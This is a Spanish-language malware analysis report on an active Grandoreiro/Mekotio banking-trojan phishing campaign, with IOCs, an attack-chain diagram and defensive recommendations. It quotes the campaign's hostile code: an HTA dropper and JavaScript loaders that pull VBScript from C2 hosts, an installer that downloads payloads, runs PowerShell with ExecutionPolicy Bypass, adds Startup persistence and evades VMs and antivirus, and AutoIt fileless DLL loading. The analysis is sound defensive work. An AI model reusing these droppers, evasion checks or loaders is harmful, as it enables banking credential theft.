# 🔬 Banking Trojan Dissection
### Análisis OSINT de campaña activa de phishing bancario

<p align="center">
  <img src="https://img.shields.io/badge/Familia-Grandoreiro%2FMekotio-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/Estado-ACTIVO-critical?style=flat-square"/>
  <img src="https://img.shields.io/badge/Metodología-OSINT%20Pasivo-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/Ref-BT--DISSECT--2026--04--12-darkblue?style=flat-square"/>
  <img src="https://img.shields.io/badge/Disclosure-Responsible-green?style=flat-square"/>
</p>

> **Autor:** Adrián Rodríguez Ortiz (x0n3) — Independent Security Researcher · MSMK University  
> **Fecha:** 12 de abril de 2026  
> **Infra desplegada:** 6 de abril de 2026 (4 días antes del análisis)  
> **Target:** Entidades bancarias LATAM + Europa (8 idiomas)

---

## ⚠️ Disclaimer

Todo el análisis fue realizado exclusivamente mediante técnicas **OSINT pasivas**: peticiones HTTP con `curl`, análisis estático de código, y detonación controlada en sandbox (Any.run). No se explotó ninguna vulnerabilidad ni se accedió a sistemas con autenticación en ningún momento. Los endpoints analizados son públicamente accesibles sin autorización previa.

---

## 📋 Índice

1. [Indicadores de Compromiso (IOCs)](#-indicadores-de-compromiso-iocs)
2. [Cadena de Ataque](#-cadena-de-ataque)
3. [Stage 0 — URL inicial y técnica de camuflaje](#stage-0--url-inicial-y-técnica-de-camuflaje)
4. [Stage 1 — Filtro OS (anti-bot)](#stage-1--filtro-os-anti-bot)
5. [Stage 2 — FingerprintJS + check.php](#stage-2--fingerprintjs--checkphp)
6. [Stage 2b — Página señuelo (BIGMAX)](#stage-2b--página-señuelo)
7. [Stage 3 — HTA Dropper](#stage-3--hta-dropper)
8. [Stages 4-5 — VBScript Loader y C2 secundario](#stages-4-5--vbscript-loader-y-c2-secundario)
9. [Stage 5 — VBScript Installer completo](#stage-5--vbscript-installer-completo)
10. [Stage 6 — AutoIt Banking Trojan (fileless)](#stage-6--autoit-banking-trojan-fileless)
11. [Conclusiones y Nivel de Amenaza](#-conclusiones-y-nivel-de-amenaza)
12. [Recomendaciones](#-recomendaciones)
13. [Herramientas utilizadas](#-herramientas-utilizadas)

---

## ☣️ Indicadores de Compromiso (IOCs)

| Indicador | Valor |
|-----------|-------|
| **IP** | `50.62.180.243` |
| **Host** | `243.180.62.50.host.secureserver.net` |
| **C2 primario** | `qui.grupoucsf.it.com` |
| **C2 secundario** | `ett.ftecasva.pro` |
| **FP API Key** | `RjPB1i3h3sNyO4deVCj0` (FingerprintJS Pro) |
| **Cert emitido** | `2026-04-06` (Let's Encrypt R13) |
| **AES-192 Key** | `99521487` (CryptDeriveKey + MD5 + CALG_AES_192) |
| **Entry point DLL** | `B080723_N()` → Grandoreiro family |
| **Firma campaña 1** | `XMBWDLKCKCLTRLPS` (b64: `WE1CV0RMS0NLQ0xUUkxQUw==`) |
| **Firma campaña 2** | `TOCTGBHFEEWXFWAK` (b64: `VE9DVEdCSEZFRVdYRldBSw==`) |
| **SHA256 Fadabe.exe** | `98e4f904f7de1644e519d09371b8afcbbf40ff3bd56d76ce4df48479a4ab884b` |
| **SHA256 Igeki.ia** | `d04b8b951376849ca1d2d4139802337e74b61d05826ba2cfc062fc0daa66c553` |
| **SHA256 Torag.ai** | `da4ac5776bbcb80d25fdd7bcabd75816f232bc02597d9bb5f72d13073d3db49a` |
| **SHA256 Anegav.exe** | `4c0cc7a436d76943027df0515a69c3281fb981ace332a3b8897ae2faf154558b` |

---

## 🗺️ Cadena de Ataque

```
URL sospechosa
    │
    ▼
[00] secureserver.net/img
     IP 243.180.62.50 invertida en hostname · TLS 4 días · GoDaddy
    │
    ▼ (solo Windows desktop)
[01] /img/ — OS filter JS
     Delay anti-sandbox 800-1800ms · bloquea Linux/Mac/móvil → bing.com
    │
    ▼
[02] /geral/ + check.php
     FingerprintJS Pro RjPB1i3h3sNyO4deVCj0 · PHPSESSID · WebRTC TURN
    │
    ├──► [status: bad] → vendas.html (señuelo BIGMAX)
    │
    ▼ (status: good)
[03] FileSaver.js → .hta dinámico
     Nombre polimórfico · body ~500 palabras aleatorias · moveTo() oculto
    │
    ▼ (mshta.exe)
[04] secureserver.net/FCBJTYFU/AJSKKFCD
     VBScript loader · type text/vbscript
    │
    ▼
[05a] ett.ftecasva.pro/g1/auxld1 (C2 secundario fallback)
    │
    ▼
[05b] qui.grupoucsf.it.com/g1/
      VBScript installer completo
      Anti-VM · Anti-sandbox · Anti-Avast
      Descarga 4 payloads · Startup shortcuts · self-delete
    │
    ▼
[06] Fadabe.exe + Igeki.ia
     AES-192 decrypt (key: 99521487) · LZMA decompress
     MemoryLoadLibrary (fileless) · VirtualAlloc(RWX)
     B080723_N() → GRANDOREIRO/MEKOTIO ACTIVO
```

---

## Stage 0 — URL inicial y técnica de camuflaje

**URL analizada:** `https://243.180.62.50.host.secureserver.net/img`

```bash
curl -v -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  "https://243.180.62.50.host.secureserver.net/img" --max-time 10
```

El hostname `243.180.62.50` resuelve a la IP **`50.62.180.243`** — la IP real está **invertida** en el nombre del subdominio. Esta técnica camufla la dirección IP maliciosa como subdominio de `secureserver.net` (GoDaddy), aprovechando la alta reputación del dominio ante filtros antispam.

```
hostname en URL:  243.180.62.50
IP real resuelta: 50.62.180.243  ← invertida
```

**Detalles de la infraestructura:**
- Hosting: GoDaddy `secureserver.net`
- TLS: Let's Encrypt R13 · emitido `2026-04-06` (solo 4 días antes del análisis)
- Servidor: `Apache/2.4.52 (Ubuntu)`
- Fachada: web corporativa falsa "BIGMAX Marketing & Tech" (`lang="pt-BR"`)

---

## Stage 1 — Filtro OS (anti-bot)

**Endpoint:** `/img/`

Al acceder, el servidor devuelve únicamente este JavaScript:

```javascript
(async function () {
  const destino  = "https://243.180.62.50.host.secureserver.net/geral/";
  const fallback = "http://bing.com";

  // Anti-sandbox: delay aleatorio para evadir análisis por timing
  const delay = Math.floor(Math.random() * (1800 - 800 + 1)) + 800;
  await sleep(delay);

  const ua       = navigator.userAgent || "";
  const platform = navigator.platform  || "";

  const isWindows = ua.toLowerCase().includes("windows") ||
                    platform.toLowerCase().includes("win");

  const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);

  // Solo deja pasar Windows desktop
  if (!isWindows || isMobile) {
    go(fallback);  // → bing.com (no levanta sospechas)
    return;
  }

  go(destino);  // → /geral/ (víctima válida)
})();
```

**Filtros activos:**
- 🚫 Linux, macOS, móviles → redirige silenciosamente a `bing.com`
- ⏱️ Delay aleatorio 800–1800ms → evade sandboxes automáticos basados en timing
- ✅ Solo pasan víctimas Windows en escritorio

---

## Stage 2 — FingerprintJS + check.php

**Endpoint:** `/geral/`

```bash
curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  "https://243.180.62.50.host.secureserver.net/geral/"
```

El loader carga **FingerprintJS Pro** con API key expuesta y envía el resultado a `check.php`:

```javascript
// API key hardcoded y reportable
import("https://fpjscdn.net/v3/RjPB1i3h3sNyO4deVCj0")
  .then(fp => fp.load())
  .then(fp => fp.get())
  .then(result => {
    setTimeout(() => doCheck(result.requestId), 2200);
  });

function doCheck(requestId) {
  fetch("check.php", {
    method: "POST",
    body: JSON.stringify({
      rid: requestId,  // requestId único de FingerprintJS
      sid: PHPSESSID   // sesión PHP
    })
  })
  .then(resp => resp.json())
  .then(data => {
    if (data.status !== "good") {
      window.location.replace("vendas.html");  // → señuelo
      return;
    }
    window.location.replace("./");  // → payload real
  });
}
```

**Respuesta observada** (sin requestId válido de browser Windows real):

```json
{"status":"bad","reason":"INVALID_REQUEST_ID"}
```

**Aspectos clave:**
- `euc1-turn.fpjs.io` usa **WebRTC TURN** para obtener la IP real aunque la víctima use VPN
- Sin un `requestId` generado por un browser Windows real, `check.php` siempre devuelve `bad`
- El dominio `euc1-turn.fpjs.io` resuelve a `3.76.113.146` (AWS Frankfurt)

---

## Stage 2b — Página señuelo

Quienes no superan el filtro (investigadores, bots, sandboxes móviles) ven la página señuelo `vendas.html`: una web corporativa completa de **"BIGMAX Marketing & Tech"** — agencia de marketing B2B falsa, en portugués brasileño, con soporte para 8 idiomas (PT, ES, EN, DE, IT, TR, FR, NL).

![BIGMAX señuelo capturado en Any.run](https://github.com/x0n3e/Phising_Report/edit/main/Image_002.png)
> *Captura de la página señuelo tal como aparece en el sandbox Any.run*

La página actúa como mecanismo de **evasión operativa**: evita la entrega del payload a usuarios no deseados y dificulta la detección temprana por soluciones de seguridad. Solo los clientes que superan la verificación de FingerprintJS continúan hacia las fases posteriores.

---

## Stage 3 — HTA Dropper

El ZIP con el `.HTA` se **genera en memoria** del browser mediante `FileSaver.js`. No existe como URL estática en el servidor.

**Nombre polimórfico por sesión:**
```
file_20260412_870346.hta
pdf_20260412_77e840.hta
img_20260412_2969a3.hta
```
Cada víctima recibe un hash diferente → imposible correlacionar en VirusTotal.

**Contenido real del `.HTA`:**

```html
<html>
<head>

<!-- signature: WE1CV0RMS0NLQ0xUUkxQUw== -->
<!-- decode base64 → XMBWDLKCKCLTRLPS  (ID de campaña) -->

<!-- mueve la ventana fuera de pantalla → invisible para la víctima -->
<script>moveTo(3724, 2213);</script>

<!-- ruta aleatoria ofuscada → carga el VBScript de Stage 4 -->
<script src="https://243.180.62.50.host.secureserver.net/FCBJTYFU/AJSKKFCD"></script>

</head>
<body>
  <!-- ~500 palabras aleatorias ES/EN/PT como ruido para evadir AV -->
  <b style='color:rgb(164,46,108)'>asiento</b>
  <i style='color:rgb(209,209,88)'>position</i>
  <!-- ... -->
</body>
</html>
```

![Pantalla de descarga HTA en Any.run](https://i.imgur.com/placeholder_hta.png)
> *Pantalla de "Security verification" que ve la víctima mientras se descarga el ZIP*

---

## Stages 4-5 — VBScript Loader y C2 secundario

**Stage 4 — Primer loader** (`secureserver.net/FCBJTYFU/AJSKKFCD`)

```javascript
var scriptEle = document.createElement("script");
scriptEle.setAttribute("src", "https://qui.grupoucsf.it.com/g1/ld1/");
scriptEle.setAttribute("type", "text/vbscript");  // ejecuta en mshta.exe
document.getElementsByTagName("head")[0].appendChild(scriptEle);
```

**Stage 5 — C2 secundario** (`ett.ftecasva.pro/g1/auxld1`)

```javascript
var scriptEle = document.createElement("script");
scriptEle.setAttribute("src", "https://qui.grupoucsf.it.com/g1/");
scriptEle.setAttribute("type", "text/vbscript");
document.getElementsByTagName("head")[0].appendChild(scriptEle);
```

`type:text/vbscript` → el código se ejecuta en el contexto de `mshta.exe` con plenos privilegios de usuario, sin sandboxing del browser.

---

## Stage 5 — VBScript Installer completo

**Endpoint:** `https://qui.grupoucsf.it.com/g1/`

### Algoritmo de desofuscación

Todas las strings del código están cifradas con un algoritmo custom de encoding por pares con clave variable (base 573):

```python
def decode(s, base=573):
    key = (ord(s[0]) - 65) + base   # primer char codifica la clave
    s = s[1:]
    result = ""
    for i in range(0, len(s)-1, 2):
        a, b = ord(s[i]) - 65, ord(s[i+1]) - 65
        result += chr((a * 25 + b) - key)
    return result

# Ejemplos:
decode("HKAJVKMLCKSLALEIJJVKRKOKVKV")  # → "WScript.Shell"
decode("K[AZQ\\A]A\\X\\J\\W\\X...")    # → "C:\\users\\public\\LAPTOP-0QF1"
decode("W\\T]E\\UZQ\\V]P\\V")          # → "cmd.exe"
decode("H\\E\\O\\FZB\\G]A\\G...")      # → "cmd.exe /c taskkill /f /im mshta.exe"
```

### Strings clave desofuscadas

| Ofuscado | Decodificado |
|----------|--------------|
| `HKAJVKMLCK...` | `WScript.Shell` |
| `K[AZQ\A]A\X...` | `C:\users\public\LAPTOP-0QF1` |
| `IZXZO[X[L...` | `C:\Program Files\Avast Software` |
| `N[G\I\L\I...` | `Fadabe.exe` |
| `I[E\J\H\N...` | `Igeki.ia` |
| `S\A]C]F\N...` | `Torag.ai` |
| `Y]B]N]N]J...` | `https://qui.grupoucsf.it.com/g1/exe.txt` |
| `A\C\O\O\K...` | `https://qui.grupoucsf.it.com/g1/6.txt` |
| `H\J\V\V\R...` | `https://qui.grupoucsf.it.com/g1/7.txt` |
| `K\M\Y\Y\U...` | `https://qui.grupoucsf.it.com/g1/sc.txt` |
| `S[Y]H\N]F...` | `Startup` (carpeta inicio Windows) |
| `W\T]E\UZQ...` | `cmd.exe` |
| `H\E\O\FZB...` | `cmd.exe /c taskkill /f /im mshta.exe` |

### Flujo completo del installer (pseudocódigo desofuscado)

```vbscript
' ── STEP 1: Anti-VM ──────────────────────────────────────────────────────────
' WMI Win32_BIOS + Win32_ComputerSystem
' Si detecta → self-delete inmediato
' Strings buscados:
'   VMware · VirtualBox · Hyper-V · Virtual PC · VRTUAL-* · Windows Virtual PC

' ── STEP 2: Anti-Sandbox (username blacklist) ─────────────────────────────────
' Si el username coincide con lista → self-delete
'   JOHN-PC · IT-Admin · WALKER · WALKER-PC · TIM-XG178L01X6X · ...

' ── STEP 3: Anti-Antivirus ───────────────────────────────────────────────────
' Si existe C:\Program Files\Avast Software → self-delete

' ── STEP 4: Directorio de trabajo ────────────────────────────────────────────
path = "C:\users\public\LAPTOP-0QF1"
FSO.CreateFolder(path)  ' si no existe

' ── STEP 5: Descargar 4 payloads del C2 ──────────────────────────────────────
' Con reintentos (hasta 5x) y verificación de Content-Length
download("https://qui.grupoucsf.it.com/g1/exe.txt", "Fadabe.exe")  ' 925 KB
download("https://qui.grupoucsf.it.com/g1/6.txt",   "Igeki.ia")    ' 12 MB
download("https://qui.grupoucsf.it.com/g1/7.txt",   "Torag.ai")    ' 5.4 MB
download("https://qui.grupoucsf.it.com/g1/sc.txt",  "Anegav.exe")  ' 1.6 MB

' ── STEP 6: Ejecutar con PowerShell ──────────────────────────────────────────
powershell -NoProfile -ExecutionPolicy Bypass
  "& 'Anegav.exe' /in 'Fadabe.exe' /out 'temp.a3x'"

' ── STEP 7: Persistencia (Startup) ───────────────────────────────────────────
CreateShortcut(Startup & "\Ibamir.lnk") ' → Fadabe.exe + Torag.ai
CreateShortcut(Startup & "\Ibef.lnk")   ' → shortcut secundario
CreateShortcut(Startup & "\Pama.lnk")   ' → Fadabe.exe + segunda carga

' ── STEP 8: Ocultar archivos ─────────────────────────────────────────────────
attrib +R +S +H Fadabe.exe   ' oculto + sistema + solo lectura
attrib +R +S +H Igeki.ia
attrib +R +S +H Torag.ai

' ── STEP 9: Auto-destrucción ─────────────────────────────────────────────────
WScript.Shell.Run "cmd.exe /c taskkill /f /im mshta.exe", 0, True
```

---

## Stage 6 — AutoIt Banking Trojan (fileless)

### Payloads descargados del C2

| Archivo | Tamaño | Tipo | SHA256 |
|---------|--------|------|--------|
| `Fadabe.exe` | 925 KB | AutoIt3 runtime (firmado GlobalSign) | `98e4f904...` |
| `Igeki.ia` | 12 MB | Payload principal AES-192 cifrado | `d04b8b95...` |
| `Torag.ai` | 5.4 MB | Módulo secundario cifrado | `da4ac577...` |
| `Anegav.exe` | 1.6 MB | Script de instalación PowerShell | `4c0cc7a4...` |
| `gera.bin` | 46 KB | AutoIt source code (desofuscado) | `35c366de...` |

### Cifrado AES-192 y ejecución fileless

```autoit
; 1. Buscar el payload cifrado en el directorio actual
Local $file = FileFindFirstFile(@ScriptDir & "\*.at")  ; → encuentra Igeki.ia

; 2. Leer en binario
Local $data = FileRead($file)

; 3. Descifrar con AES-192
;    CryptDeriveKey + MD5 + CALG_AES_192 (0x0000660F)
Local $key  = "99521487"    ; clave hardcoded en el source
Local $mode = 0x0000660F    ; CALG_AES_192
Local $dec  = CryptDecrypt($data, $key, $mode)
; → DLL Windows descomprimida con LZMA

; 4. Cargar DLL en RAM sin tocar disco (FILELESS)
Local $handle = MemoryLoadLibrary($dec)
; VirtualAlloc(0x1000, 0x40) → página RWX en RAM

; 5. Ejecutar el entry point del banking trojan
Local $fn = MemoryGetProcAddress($handle, "B080723_N")
DllCallAddress("int", $fn)  ; ← TROJAN ACTIVO EN RAM
```

### Funciones de seguridad en gera.bin

```
CryptAcquireContext()    → inicializa contexto crypto (Advapi32.dll)
CryptDeriveKey()         → deriva clave AES-192 de '99521487'
CryptDecrypt()           → descifra Igeki.ia en RAM
CryptGenRandom()         → bytes aleatorios

VirtualAlloc(RWX)        → reserva página ejecutable en RAM
MemoryLoadLibrary()      → carga DLL en RAM sin escribir a disco ← fileless
MemoryGetProcAddress()   → obtiene dirección de B080723_N()
MemoryFreeLibrary()      → libera DLL tras ejecución

LoadLibraryW()           → carga kernel32, msvcrt dinámicamente
GetProcAddress()         → resuelve funciones en tiempo de ejecución
```

**Familia:** Grandoreiro / Mekotio  
**Técnica de infección:** Overlay bancario — ventanas falsas superpuestas a apps bancarias reales para interceptar credenciales

---

## 📊 Conclusiones y Nivel de Amenaza

| Dimensión | Valoración | Detalle |
|-----------|-----------|---------|
| **Sofisticación** | Media-Alta | Kit multi-stage con evasión activa en cada capa |
| **Estado** | 🔴 **ACTIVO** | Infraestructura desplegada 4 días antes del análisis |
| **Persistencia** | Alta | Múltiples mecanismos: Startup, attrib, MemoryDLL |
| **Evasión AV** | Alta | Fileless execution, AES-192, nombre polimórfico |
| **Alcance geo** | LATAM + Europa | 8 idiomas: PT, ES, EN, DE, IT, TR, FR, NL |
| **Familia** | Grandoreiro/Mekotio | Banking trojan activo con múltiples campañas |

La campaña analizada representa una amenaza activa y bien estructurada dirigida a usuarios de banca online en España, Portugal y LATAM. La combinación de evasión multi-stage, fingerprinting activo mediante FingerprintJS Pro, ejecución fileless y persistencia robusta la sitúa **por encima de la media** de campañas de phishing bancario convencionales.

---

## 💡 Recomendaciones

| # | Acción | Detalle |
|---|--------|---------|
| 1 | **Bloqueo de IOCs** | Añadir IPs, dominios y hashes a firewall, proxy y EDR |
| 2 | **Reporte FingerprintJS** | Notificar API key `RjPB1i3h3sNyO4deVCj0` a `security@fingerprint.com` |
| 3 | **Reporte GoDaddy** | `https://supportcenter.secureserver.net/abusereport/phishing` |
| 4 | **URLhaus / MalwareBazaar** | Publicar IOCs en `urlhaus.abuse.ch` y `bazaar.abuse.ch` |
| 5 | **Monitorización** | Alertar sobre patrón `[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\.host\.secureserver\.net` |
| 6 | **Detección HTA** | Alertar sobre `mshta.exe` + conexión a dominios no corporativos |
| 7 | **Concienciación** | Informar a usuarios sobre pantalla de verificación falsa con barra de progreso |

---

## 🛠️ Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `curl` | Análisis de endpoints HTTP/HTTPS, extracción de código |
| `Python 3` | Implementación del desofuscador base-573 |
| `Any.run` | Sandbox Windows 10 para detonación controlada |
| `tshark` | Análisis del PCAP capturado en sandbox |
| `strings` / `xxd` | Análisis estático de binarios |

---

## 📬 Reporte de abuso

| Plataforma | Enlace |
|-----------|--------|
| INCIBE-CERT | https://www.incibe.es/linea-de-ayuda-en-ciberseguridad/reporte-de-fraude |
| GoDaddy | https://supportcenter.secureserver.net/abusereport/phishing |
| FingerprintJS | security@fingerprint.com |
| URLhaus | https://urlhaus.abuse.ch/addurl/ |
| MalwareBazaar | https://bazaar.abuse.ch/upload/ |

---

<p align="center">
  <b>Adrián Rodríguez Ortiz (x0n3)</b><br>
  <a href="https://github.com/x0n3e">github.com/x0n3e</a> · 
  <a href="https://www.linkedin.com/in/adrian-rodriguez-ortiz">LinkedIn</a><br>
  <i>Análisis realizado con fines educativos · MSMK University · Abril 2026</i>
</p>
